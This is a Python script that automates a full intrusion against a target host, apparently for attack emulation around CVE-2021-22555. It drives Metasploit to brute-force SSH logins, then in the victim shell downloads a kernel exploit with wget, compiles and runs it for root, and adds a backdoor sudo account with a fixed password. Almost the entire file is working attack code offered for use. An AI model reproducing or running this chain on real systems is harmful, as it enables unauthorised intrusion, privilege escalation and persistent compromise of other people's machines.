#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Filename : cve202122555.py
@CreatedTime : 2023/05/01 11:11


This program has a function to automate the attack on CVE-2021-22555. There are several steps in the attack.
1. Ping to check connection to the tartget
2. Check the target is live or not
3. Perform full open scan to the target
4. Exploiting the target through SSH
5. Sending the exploit to the target through opened exploit session
7. compiling and executing the exploit

'''


############################################################################
# Import modules
############################################################################

import os
import sys
import time
import argparse
import nmap
from ping3 import ping, verbose_ping
from pymetasploit3.msfrpc import MsfRpcClient


############################################################################

__author__ = 'masjohncook'
__copyright__ = '(C)Copyright 2023'
__credits__ = []
__license__ = 'None'
__version__ = '0.0.1'
__maintainer__ = 'masjohncook'
__email__ = 'mas.john.cook@gmail.com'
__status__ = 'None'

############################################################################

client = MsfRpcClient('1234')

class ExploitCVE(object):
    def __init__(self, target_ip, target_port):
        """
        Return the object with the data of target_ip and target_port

        Args:
            target_ip (String): the IP Address of the target
            target_port (String): the designated port of the target
        """
        self.ip = target_ip
        self.port = target_port
    
    # perform ping to the target to check simulate the host ping
    def pingTarget(self):
        """
        Perform ping to the target_ip to check the connection between machines
        """
        print(verbose_ping(self.ip, count=20))
            
    # check the host status through nmap
    def checkStatus(self):
        """
        This function will check the status of target machine. It use Nmap tools to check the host status
        and will print the host status up or down
        """
        nm = nmap.PortScanner()
        status = nm.scan(hosts=self.ip, arguments='-n -sP -PE -PA21,23,80,3389')
        host_status = nm[self.ip]['status']['state']
        # print("Target {} is {}".format(self.ip, host_status))
        return host_status
        
    # perform full open scan using Nmap
    def scanningTarget(self):
        """
        This function perform full open scan through Nmap. We didn't use the information here. 
        We only emulate the scanning phase in the hacker attack
        """
        nm = nmap.PortScanner()
        result = nm.scan(hosts=self.ip, arguments='-O -A -p 0-65535')
        
    # exploiting the target using ssh_login auxiliary module
    def openShellSession(self):
        """
        This function will perform bruteforce to the target machine through SSH using metasploit auxiliary module
        """

        user_file = os.path.abspath('resources/user.lst')
        pass_file = os.path.abspath('resources/password.lst')

        try:
            auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            auxiliary['PASS_FILE'] = pass_file
            auxiliary['USER_FILE'] = user_file
            auxiliary['RHOSTS'] = self.ip
            auxiliary['RPORT'] = 22

            execute = auxiliary.execute()
            print(execute)
            
            # let the exploit work and finish to open the session
            time.sleep(300)
            
            shell = client.sessions.session(list(client.sessions.list.keys())[0])
            return shell
        except Exception as e:
            print(e)
    
    def checkShellSession(slef):
        """
        funtion to check wether the shell session was opened successfully
        """        
        shell = client.sessions.list
        
        return shell
    
    # send the command trouch the open session to download the exploit       
    def sendCommand(self):
        """
        This function will download , compile, and run the exploit on the target machine after obtaining the shell session.
        this exploit will give a root access since the opened shell session is only give the standard user privileges
        """            
        shell = client.sessions.session(list(client.sessions.list.keys())[0])

        # Write to the shell
        shell.write('wget https://www.exploit-db.com/download/50135 -O exploit.c')
        time.sleep(10)
        # Print the output
        print(shell.read())
        time.sleep(5)
        shell.write('ls -al exploit.c')
    
    def exploitTarget(self):
        """
        This function will compiling the exploit and run the exploit for privilege escalation
        """
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        
        #compiling the exploit
        shell.write('gcc -m32 --static -o exploit exploit.c ')
        time.sleep(5)
        print(shell.read())
        shell.write('ls -al exploit')
        time.sleep(5)
        print(shell.read())
        shell.write('./exploit')
        time.sleep(10)
        print(shell.read())
        shell.write('whoami')
        time.sleep(10)
        root_status = shell.read()
        return root_status
    
    def createUser(self):
        """
        function for creating user backdoor on the target machine after obtaining root access
        """
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        shell.write('useradd -s /bin/bash -d /home/vivek/ -m -G sudo vivek')
        time.sleep(10)
        print(shell.read())
        shell.write('passwd vivek')
        shell.write('1234')


def main():
    current_filename = os.path.basename(__file__)
    
    # parsing the argv for arguments handling and print help
    parser = argparse.ArgumentParser(
    prog='python {}'.format(current_filename),
    description='',
    epilog='Have a nice day'
    )

    parser.add_argument('ip_address', help='IP address of the target machine', type=str)
    parser.add_argument('-p', '--port', help='Port number of the target machine', type=int)
    
    args = parser.parse_args()
    
    ip = args.ip_address
    
    if args.port:
        port = args.port
    else:
        port = None
    
    
    try:
        ec = ExploitCVE(ip, port)
        print("############################################################################")
        print("#    1. Perform ping to the target server...")
        print("############################################################################")
        ec.pingTarget()
        
        print("############################################################################")
        print("#    2. Checking the host status...")
        print("############################################################################")
        if ec.checkStatus() == 'up':
            print("The host {} is up!".format(ip))
            print("Checking host status finished!")
            
            print("############################################################################")
            print("#    3. Running full-open scan on the target...")
            print("############################################################################")
            ec.scanningTarget()
            print("Scan the target finished!")
            
            print("############################################################################")
            print("#    4. Checking the opened shell session...")
            print("############################################################################")
            if ec.checkShellSession():
                print("Shell session already opened")
                print("############################################################################")
                print("#    6. Downloading and executing the exploit...")
                print("############################################################################")
                ec.sendCommand()
                ec.exploitTarget()
                print("############################################################################")
                print("#    7. Creating user backdoor...")
                print("############################################################################")
                ec.createUser()
            else:
                print("No shell session opened!")
                print("############################################################################")
                print("#    5. Exploiting the target...")
                print("############################################################################")
                if ec.openShellSession():
                    print("Exploiting the target")
                    print("############################################################################")
                    print("#    6. Downloading and executing the exploit...")
                    print("############################################################################")
                    ec.sendCommand()
                    ec.exploitTarget()
                    
                    print("############################################################################")
                    print("#    7. Creating user backdoor...")
                    print("############################################################################")
                    ec.createUser()

                else:
                    print("Target can not be exploited!")
                    pass
        else:
            print("Host is down!")
            print("Exiting....")
            pass
    except Exception as e:
        print(e)
        pass

main()